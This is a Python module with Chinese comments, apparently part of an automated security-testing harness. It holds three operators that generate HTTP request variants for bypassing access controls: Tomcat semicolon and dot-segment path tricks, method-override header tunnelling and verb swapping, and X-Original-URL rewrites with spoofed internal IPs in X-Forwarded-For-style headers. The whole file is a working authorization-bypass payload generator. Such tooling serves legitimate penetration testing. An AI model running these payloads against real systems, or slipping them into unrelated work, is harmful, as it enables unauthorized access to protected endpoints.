# -*- coding: utf-8 -*-
"""
Invar 确定性强类型算子库 (Canonical Typed Operators)
对标系统宪法：将 F1~F3 变异算法从硬编码逻辑中彻底提炼为纯函数算子。
所有算子接收基础网络语义，确定性输出不可变的 List[HttpSendSpec]，直接兼容 Tool Gateway。
"""

from urllib.parse import urlparse, urlunparse
from typing import List, Dict, Optional, Any
from harness.tools.tool_contracts import HttpSendSpec

class PathNormalizationOperator:
    """
    【F1 族】路径规范化与畸变算子 (Path Normalization Operator)
    收录点斜杠解析、Tomcat 分号畸变、空白符与后缀混淆等确定性变换
    """

    @classmethod
    def generate_specs(cls, method: str, url: str, headers: Optional[Dict[str, str]] = None) -> List[HttpSendSpec]:
        parsed = urlparse(url)
        clean_path = parsed.path.rstrip("/")
        if not clean_path:
            clean_path = "/"

        mutated_paths = [
            f"{clean_path}/.",            # 尾部点号
            f"{clean_path}//",            # 尾部双斜杠
            f"{clean_path}/..;/",         # Tomcat 分号路径跳跃
            f"{clean_path};/",            # Tomcat 尾部分号
            f"{clean_path}/;/",           # Tomcat 独立分号段
            f"{clean_path}%20",           # 尾部空格编码
            f"{clean_path}.json",         # 扩展名伪装
            f"{clean_path}?",             # 伪查询空分隔
        ]

        # 内部路径分段插入 (如 /api/v1 -> /api/./v1 以及 /;/ 插入)
        parts = [p for p in clean_path.split("/") if p]
        if len(parts) >= 2:
            mutated_paths.append("/" + "/./".join(parts))
            mutated_paths.append("/;/".join(parts) if clean_path.startswith("/") else ";/".join(parts))

        specs: List[HttpSendSpec] = []
        for mp in mutated_paths:
            new_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                mp,
                parsed.params,
                parsed.query,
                parsed.fragment
            ))
            specs.append(HttpSendSpec(
                method=method.upper(),
                url=new_url,
                headers=dict(headers or {})
            ))

        return specs

class MethodTunnelOperator:
    """
    【F2 族】动词语义与隧道穿透算子 (Method Tunnel Operator)
    收录 HTTP 动词覆盖头、同等破坏力动词替换与空载荷降级
    """

    OVERRIDE_HEADERS = [
        "X-HTTP-Method-Override",
        "X-HTTP-Method",
        "X-Method-Override"
    ]

    @classmethod
    def generate_specs(cls, method: str, url: str, headers: Optional[Dict[str, str]] = None, target_verb: Optional[str] = None) -> List[HttpSendSpec]:
        m_upper = method.upper()
        effective_target = (target_verb or m_upper).upper()
        base_headers = dict(headers or {})
        specs: List[HttpSendSpec] = []

        # 1. 动词隧道头注入 (例如用 POST 发包，但携带 X-HTTP-Method-Override: PUT/DELETE)
        for h_name in cls.OVERRIDE_HEADERS:
            h_copy = dict(base_headers)
            h_copy[h_name] = effective_target
            specs.append(HttpSendSpec(
                method="POST",
                url=url,
                headers=h_copy,
                payload_bytes=b"{}"
            ))

        # 2. 动词替换 (Verb Substitution: POST <-> PUT / PATCH)
        alternative_verbs = [v for v in ["GET", "POST", "PUT", "PATCH"] if v != m_upper]
        for alt_v in alternative_verbs:
            specs.append(HttpSendSpec(
                method=alt_v,
                url=url,
                headers=dict(base_headers)
            ))

        return specs

class HeaderTrustOperator:
    """
    【F3 族】代理头与信任上下文穿透算子 (Header Trust Operator)
    收录 X-Rewrite-URL / X-Original-URL 路径重定向与内部 IP 伪装头
    """

    TRUST_IP_LIST = [
        "127.0.0.1",
        "localhost",
        "10.0.0.1",
        "192.168.1.1"
    ]

    @classmethod
    def generate_specs(cls, method: str, url: str, headers: Optional[Dict[str, str]] = None) -> List[HttpSendSpec]:
        parsed = urlparse(url)
        target_path = parsed.path or "/"
        root_url = urlunparse((parsed.scheme, parsed.netloc, "/", "", parsed.query, ""))
        base_headers = dict(headers or {})
        specs: List[HttpSendSpec] = []

        # 1. 代理路径重写头 (请求根路由 '/'，但请求头指定内部路径)
        for rw_header in ["X-Rewrite-URL", "X-Original-URL", "X-Forwarded-Prefix"]:
            h_rw = dict(base_headers)
            h_rw[rw_header] = target_path
            specs.append(HttpSendSpec(
                method=method.upper(),
                url=root_url,
                headers=h_rw
            ))

        # 2. 客户端内网 IP 伪装标头
        for ip in cls.TRUST_IP_LIST:
            for ip_header in ["X-Forwarded-For", "X-Real-IP", "Client-IP", "X-Custom-IP-Authorization"]:
                h_ip = dict(base_headers)
                h_ip[ip_header] = ip
                specs.append(HttpSendSpec(
                    method=method.upper(),
                    url=url,
                    headers=h_ip
                ))

        return specs
